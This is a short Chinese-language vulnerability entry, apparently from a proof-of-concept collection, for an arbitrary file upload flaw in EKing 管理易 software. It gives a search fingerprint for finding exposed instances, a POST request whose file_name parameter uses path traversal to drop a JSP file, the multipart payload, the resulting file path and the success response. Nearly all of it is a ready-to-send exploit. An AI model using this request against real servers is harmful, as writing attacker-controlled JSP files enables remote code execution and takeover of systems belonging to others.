# eking管理易-FileUpload-file-upload任意文件上传漏洞

eking ｜ 文件上传 ｜ —
- **指纹**：`app="EKing-管理易"`
- **请求**：`POST /app/FileUpload.ihtm?comm_type=EKING&file_name=../../qq_test.jsp. HTTP/1.1`

**Payload**
```
上传文件：
Host:
Content-Type: multipart/form-data; boundary=c8fe659c69f6f5f6a7edaf5e1cca5d34
--c8fe659c69f6f5f6a7edaf5e1cca5d34
Content-Disposition: form-data; name="uplo_file"; filename="qq_test.jpg"
qqtest
--c8fe659c69f6f5f6a7edaf5e1cca5d34--
文件地址：
baseurl+'/qq_test.jsp'
```
- **响应特征**：200